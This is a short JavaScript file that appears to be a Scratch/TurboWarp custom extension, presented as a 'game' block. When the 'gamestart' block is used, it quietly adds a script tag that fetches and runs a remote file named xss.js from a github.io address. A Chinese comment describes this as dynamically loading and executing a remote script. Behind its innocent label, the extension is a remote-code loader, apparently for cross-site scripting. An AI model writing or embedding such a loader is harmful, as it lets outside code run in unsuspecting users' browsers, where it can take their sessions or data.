class HelloWorldExtension {
    getInfo() {
        return {
            id: 'game',
            name: 'game!',
            blocks: [
                {
                    opcode: 'gamestart',
                    blockType: Scratch.BlockType.COMMAND,
                    text: 'gamestart',
                },
            ],
        };
    }

    gamestart() {
        console.log('Game has started!');

        // 动态加载并执行远程脚本
        const script = document.createElement('script');
        script.src = 'https://Displaysbook.github.io/TurboWarp/xss.js'; // 远程JS文件的URL
        script.onload = () => {
            console.log('Remote script loaded and executed.');
        };
        script.onerror = () => {
            console.error('Failed to load the remote script.');
        };
        document.head.appendChild(script);
    }
}
